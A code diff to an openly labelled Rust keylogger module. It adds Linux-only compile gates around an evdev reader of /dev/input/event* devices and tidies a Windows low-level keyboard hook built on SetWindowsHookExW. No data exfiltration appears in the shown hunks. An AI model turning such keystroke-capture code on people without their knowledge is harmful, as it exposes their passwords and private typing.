@@ -28,10 +28,14 @@
 //! does not have the necessary permissions.
 
 use std::collections::VecDeque;
-use std::io;
-use std::os::fd::AsRawFd;
-use std::path::PathBuf;
 use std::time::Instant;
+
+#[cfg(target_os = "linux")]
+use std::io;
+#[cfg(target_os = "linux")]
+use std::os::fd::AsRawFd;
+#[cfg(target_os = "linux")]
+use std::path::PathBuf;
 
 // ---------------------------------------------------------------------------
 // Core data types
@@ -91,6 +95,7 @@ pub trait KeyLogger {
 // Linux evdev implementation
 // ---------------------------------------------------------------------------
 
+#[cfg(target_os = "linux")]
 /// Linux input_event structure as defined in `<linux/input.h>`.
 ///
 /// The kernel publishes events from `/dev/input/event*` as an array of
@@ -114,13 +119,17 @@ pub struct libc_input_event {
 }
 
 /// Event type constants from `<linux/input-event-codes.h>`.
+#[cfg(target_os = "linux")]
 const EV_SYN: u16 = 0x00;
+#[cfg(target_os = "linux")]
 const EV_KEY: u16 = 0x01;
 
 /// Synchronisation event codes.
+#[cfg(target_os = "linux")]
 const SYN_REPORT: u16 = 0;
 
 /// Size of a `libc_input_event` on a 64-bit Linux system.
+#[cfg(target_os = "linux")]
 const INPUT_EVENT_SIZE: usize = 24;
 
 /// A lightweight mapping of evdev key codes to printable `char` values
@@ -182,6 +191,7 @@ fn evdev_keycode_to_char(code: u16, shifted: bool) -> Option<char> {
     }
 }
 
+#[cfg(target_os = "linux")]
 /// Linux evdev-based keylogger.
 ///
 /// Reads raw `input_event` records from `/dev/input/event*` device
@@ -215,6 +225,7 @@ pub struct EvdevKeyLogger {
     shift_pressed: bool,
 }
 
+#[cfg(target_os = "linux")]
 impl EvdevKeyLogger {
     pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
         let devices = Self::find_keyboard_devices()?;
@@ -285,11 +296,16 @@ impl EvdevKeyLogger {
     }
 }
 
+#[cfg(target_os = "linux")]
 const KEY_ENTER: u16 = 28;
+#[cfg(target_os = "linux")]
 const KEY_BACKSPACE: u16 = 14;
+#[cfg(target_os = "linux")]
 const KEY_TAB: u16 = 15;
+#[cfg(target_os = "linux")]
 const KEY_ESC: u16 = 1;
 
+#[cfg(target_os = "linux")]
 impl KeyLogger for EvdevKeyLogger {
     fn start(&mut self) -> Result<(), Box<dyn std::error::Error>> {
         if self.running { return Ok(()); }
@@ -338,8 +354,11 @@ impl KeyLogger for EvdevKeyLogger {
 // ---------------------------------------------------------------------------
 
 #[cfg(windows)]
+use windows::Win32::UI::WindowsAndMessaging::HHOOK;
+
+#[cfg(windows)]
 pub struct WindowsKeyLogger {
-    hook: windows::Win32::Foundation::HHOOK,
+    hook: HHOOK,
     buffer: VecDeque<KeyEvent>,
     running: bool,
 }
@@ -357,12 +376,14 @@ unsafe extern "system" fn keyboard_hook_callback(
     wparam: windows::Win32::Foundation::WPARAM,
     lparam: windows::Win32::Foundation::LPARAM,
 ) -> windows::Win32::Foundation::LRESULT {
-    use windows::Win32::UI::WindowsAndMessaging::{KBDLLHOOKSTRUCT, WH_KEYBOARD_LL};
+    use windows::Win32::UI::WindowsAndMessaging::{
+        CallNextHookEx, KBDLLHOOKSTRUCT, WM_KEYDOWN, WM_SYSKEYDOWN,
+    };
 
     if code >= 0 {
-        let kb = &*(lparam as *const KBDLLHOOKSTRUCT);
-        let is_key_down = wparam.0 as u32 == windows::Win32::UI::WindowsAndMessaging::WM_KEYDOWN.0 as u32
-            || wparam.0 as u32 == windows::Win32::UI::WindowsAndMessaging::WM_SYSKEYDOWN.0 as u32;
+        let kb = &*(lparam.0 as *const KBDLLHOOKSTRUCT);
+        let is_key_down = wparam.0 as u32 == WM_KEYDOWN
+            || wparam.0 as u32 == WM_SYSKEYDOWN;
 
         let event = KeyEvent::new(kb.vkCode as u16, None, is_key_down);
 
@@ -374,7 +395,7 @@ unsafe extern "system" fn keyboard_hook_callback(
     }
 
     // Pass to the next hook in the chain.
-    windows::Win32::UI::WindowsAndMessaging::CallNextHookEx(None, code, wparam, lparam)
+    CallNextHookEx(None, code, wparam, lparam)
 }
 
 #[cfg(windows)]
@@ -382,7 +403,7 @@ impl WindowsKeyLogger {
     #[must_use]
     pub fn new() -> Self {
         Self {
-            hook: windows::Win32::Foundation::HHOOK::default(),
+            hook: HHOOK::default(),
             buffer: VecDeque::new(),
             running: false,
         }
@@ -406,10 +427,11 @@ impl KeyLogger for WindowsKeyLogger {
         // Install the low-level keyboard hook.
         let hook = unsafe {
             SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_hook_callback), None, 0)
-        };
+        }
+        .map_err(|_| "SetWindowsHookExW failed")?;
 
         if hook.is_invalid() {
-            return Err("SetWindowsHookExW failed".into());
+            return Err("SetWindowsHookExW returned invalid hook".into());
         }
 
         self.hook = hook;
@@ -472,12 +494,14 @@ mod tests {
         let _ = format!("{a:?}");
     }
 
+    #[cfg(target_os = "linux")]
     #[test]
     fn device_enumeration_returns_vec() {
         let devices = EvdevKeyLogger::find_keyboard_devices().unwrap_or_default();
         assert!(devices.iter().all(|p| { p.to_string_lossy().starts_with("/dev/input/event") }));
     }
 
+    #[cfg(target_os = "linux")]
     #[test]
     fn evdev_logger_creation() {
         let result = EvdevKeyLogger::new();
